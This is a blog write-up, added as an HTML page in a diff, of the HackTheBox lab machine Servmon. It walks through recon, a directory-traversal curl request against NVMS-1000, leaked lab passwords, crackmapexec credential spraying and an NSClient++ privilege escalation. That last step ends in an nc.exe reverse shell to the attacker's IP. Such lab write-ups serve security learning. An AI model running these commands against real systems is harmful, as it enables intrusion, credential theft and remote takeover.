@@ -1,0 +1,225 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Servmon HTB - WriteUP // 0xl3mon💀</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="0xl3mon" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Servmon HTB - WriteUP"/>
+<meta name="twitter:description" content="Servmon - 10.129.48.113 Reconnaissance Nmap Recon Results Discovery OS System
+ttl = 127 Windows System Recon Nmap open ports
+Service Enumeration
+21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM &lt;DIR&gt; Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1."/>
+
+    <meta property="og:title" content="Servmon HTB - WriteUP" />
+<meta property="og:description" content="Servmon - 10.129.48.113 Reconnaissance Nmap Recon Results Discovery OS System
+ttl = 127 Windows System Recon Nmap open ports
+Service Enumeration
+21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM &lt;DIR&gt; Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xl3mon.github.io/htb/servmon-htb-writeup/" />
+<meta property="article:published_time" content="2022-03-27T15:18:19+02:00" />
+<meta property="article:modified_time" content="2022-03-27T15:18:19+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/panda-rose.jpg" alt="0xl3mon" /></a>
+      <h1>0xl3mon💀</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/">𝘏𝘰𝘮𝘦</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">𝘏𝘢𝘤𝘬𝘛𝘩𝘦𝘉𝘰𝘹</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">𝘈𝘣𝘰𝘶𝘵</a>
+      </nav>
+      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Servmon HTB - WriteUP</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 27, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="servmon---1012948113">Servmon - 10.129.48.113</h1>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap-recon-results">Nmap Recon Results</h3>
+<p><strong>Discovery OS System</strong></p>
+<p><img src="https://i.imgur.com/cCnO3mF.png" alt="" title="Windows System"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ttl <span style="color:#f92672">=</span> <span style="color:#ae81ff">127</span> Windows System
+</code></pre></div><p><strong>Recon Nmap open ports</strong></p>
+<p><img src="https://i.imgur.com/sFspw4b.png" alt=""></p>
+<p><strong>Service Enumeration</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">21/tcp   open  ftp           Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+|_01-18-20  12:05PM       &lt;DIR&gt;          Users
+| ftp-syst: 
+|_  SYST: Windows_NT
+22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp   open  http
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+|     Content-type: text/html
+|     Content-Length: <span style="color:#ae81ff">340</span>
+|     Connection: close
+|     AuthInfo: 
+|     &lt;!DOCTYPE html PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34;</span> <span style="color:#e6db74">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;</span>&gt;
+|     &lt;html xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xhtml&#34;</span>&gt;
+|     &lt;head&gt;
+|     &lt;title&gt;&lt;/title&gt;
+|     &lt;script type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
+|     window.location.href <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Pages/login.htm&#34;</span>;
+|     &lt;/script&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   NULL: 
+|     HTTP/1.1 <span style="color:#ae81ff">408</span> Request Timeout
+|     Content-type: text/html
+|     Content-Length: <span style="color:#ae81ff">0</span>
+|     Connection: close
+|_    AuthInfo:
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5666/tcp open  tcpwrapped
+6699/tcp open  napster?
+8443/tcp open  ssl/https-alt
+
+</code></pre></div><p><strong>Web Service Information</strong></p>
+<p><img src="https://i.imgur.com/iKtGLMz.png" alt="" title="whatweb"></p>
+<h3 id="enumeration">Enumeration</h3>
+<p>As it can be seen from the above nmap scan that ftp allows anonymous service. So, let’s enumerate the FTP service by connecting to it as anonymous. We have a directory called Users. Inside that directory, we found two users named <strong>Nadine</strong> and <strong>Nathan</strong>. Now let’s go inside a directory named  Nadine we have a file with txt extension named <strong>Confidential.txt</strong>. After downloading this txt file we went inside a directory named Nathan and found another file with txt extension named Notes to do.txt and we quickly downloaded this file in our terminal.</p>
+<p><strong>Ftp Services</strong>
+<img src="https://i.imgur.com/y8z0Oya.png" alt=""></p>
+<p>we found the following file inside the directorys on ftp service</p>
+<p><strong>Confidential.txt</strong></p>
+<p><img src="https://i.imgur.com/mOBD9gV.png" alt=""></p>
+<p><strong>Notes-To-Do.txt</strong></p>
+<p><img src="https://i.imgur.com/tQ7By2s.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">- Possible Users
+	- Nathan
+	- Nadine
+</code></pre></div><p>After downloading both files to our terminal we logged out of FTP and decided to take a look at the files. Confidential.txt told us that a password has been left on Desktop of Nathan and notes to do.txt file asked us to complete the leftover task and told us about three services NVMS, NSClient and SharePoint. And we know that the NVMS is behind port 80 and NSClient is behind port 8443.</p>
+<p><strong>Web Service Information</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://10.129.48.113/Pages/login.htm 
+</code></pre></div><p><img src="https://i.imgur.com/8ta7kzG.png" alt=""></p>
+<p>we tried with default credentials in the service, but we had no luck &hellip; also from what we read in the note we can deduce that it is not the correct way</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">https://10.129.48.113:8443/index.html
+</code></pre></div><p><img src="https://i.imgur.com/Qb0PhYo.png" alt=""></p>
+<p><strong>Identifying vulnerabilities</strong>
+As we were not able to get out hands on credentials in our initial enumeration. We will have to figure out a different way to get through this Authorization Login Panel of NVMS-1000.So we used the searchsploit to search for any available exploits.</p>
+<p><strong>Nvms 1000</strong></p>
+<p><img src="https://i.imgur.com/3YLb23z.png%7Bheight=30%25%7D" alt=""></p>
+<p><strong>NSClient</strong></p>
+<p><img src="https://i.imgur.com/3lvXm3q.png" alt="" title=" NSClient">
+as can see we have a potential exploit to privilege escalation if we found valid credentials to abuse of the NSCLIENT++ Services</p>
+<h3 id="explotation">Explotation</h3>
+<p><strong>Directory Traversal</strong></p>
+<p><strong>Burpsuite</strong></p>
+<p><img src="https://i.imgur.com/gSF3HZ3.png" alt=""></p>
+<p>Or with Curl  \</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -s -X GET <span style="color:#e6db74">&#34;http://10.129.48.113/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt&#34;</span> --path-as-is
+</code></pre></div><p><img src="https://i.imgur.com/WcQtKFL.png" alt="" title="Directory Traversal Curl"></p>
+<p>We saw that exploit told us that it is an unauthenticated directory traversal vulnerability which exists in TVT network surveillance management software-1000 version 3.4.1. NVMS listens by default on port 80.  Since we already know there is password.txt located on Desktop of Nathan so we will now try to extract the content of Password.txt using curl with its option –path-as-is so that the path provided in URL does remove any DOT segments.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+</code></pre></div><p>-<strong>NsClient</strong></p>
+<p><img src="https://i.imgur.com/5eb2Sxt.png" alt=""></p>
+<p><strong>Brute Force with Crackmapexec</strong></p>
+<p>We have a username and password, so we tried to bruteforce the smb service to found valid credentials on the target system and we were successfully able to log in with ssh.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cmpe smb 10.129.48.113 -u users -p passwords
+</code></pre></div><p><img src="https://i.imgur.com/6bOkyLe.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">- Valid credentials : 
+	- Nadine : L1k3B1gBut7s@W0rk
+</code></pre></div><p><strong>SSH Login with Nadine Credentials</strong></p>
+<p><img src="https://i.imgur.com/hBWC1kC.png" alt=""></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Now it’s time to escalate privileges on the lab. Now if we go back to Notes file we discovered during ftp login we got to know that there is NSClient on which user has worked. Next, we enumerated the user directory to look into the Program Files directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Directory of C:\\Program Files
+</code></pre></div><p>After entering Program Files we found another interesting directory named NSClient which was mentioned in Notes file we found during ftp login. Now let’s dive inside the NSClient directory.</p>
+<p><img src="https://i.imgur.com/ziGwmhC.png" alt=""></p>
+<p>Here we found a file with <code>.ini</code> extension named <code>nsclient.in</code> seems like it contains some kind of text-based content which can be useful for us for moving. It may also contain some kind of password for Admin just a guess.</p>
+<p><img src="https://i.imgur.com/fGn4Au5.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Password : ew2x6SsGTxjRwXOT
+</code></pre></div><p>Now if we recall Nathan’s Notes to do.txt it talked about locking down NSClient so here it is confirmed from the above screenshot which states only localhost(127.0.0.1) is allowed to access. NSClient is working on port 8443 which is opened on localhost(127.0.0.1).</p>
+<p>Since we know ssh is enabled so we can perform Local ssh tunnelling which will make our work easier. Now again we switch into Kali Linux for local tunnelling.</p>
+<p>Execute given below command for forwarding port to the local machine.</p>
+<p><strong>Local Port Forwarding</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh -L 8443:127.0.0.1:8443 nadine@10.129.48.113 -fNT
+</code></pre></div><p><img src="https://i.imgur.com/wqf7gC7.png" alt=""></p>
+<p>The next thing we will do is get a shell as administrator using netcat shells (i tried nishang but it seems to be blocked by antivirus)</p>
+<p>I copied a netcat listener to the box in <code>C:/Temp</code>  directory and</p>
+<p>I did set up a listener on my box
+<img src="https://i.imgur.com/KvIrQVs.png" alt=""></p>
+<p>we will execute the exploit that we found previously to privesc</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">python3 exploit<span style="color:#f92672">-</span>NSCLIENT<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>t <span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span> <span style="color:#f92672">-</span>P <span style="color:#ae81ff">8443</span> <span style="color:#f92672">-</span>p ew2x6SsGTxjRwXOT <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;c:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">emp</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">c.exe -e cmd.exe 10.10.14.31 443&#39;</span>
+</code></pre></div><p><img src="https://i.imgur.com/rdSyAAG.png" alt=""></p>
+<p>Now we are <code>nt_authority</code></p>
+<p><img src="https://i.imgur.com/ViulJjM.png" alt=""></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
